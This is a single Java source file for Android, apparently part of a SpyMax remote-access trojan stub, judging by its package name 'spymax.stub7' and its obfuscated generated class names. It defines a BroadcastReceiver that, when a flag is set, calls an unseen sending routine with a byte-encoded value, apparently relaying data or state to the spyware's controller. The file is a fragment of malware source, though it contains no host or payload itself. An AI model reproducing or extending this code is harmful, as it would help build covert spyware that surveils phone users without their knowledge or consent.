package spymax.stub7;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class ClassGen14 extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent i) {
        if(ClassGen2.echo){
            ClassGen2.se(ClassGen3.jz,String.valueOf(ClassGen3.ju).getBytes());
        }
    }
}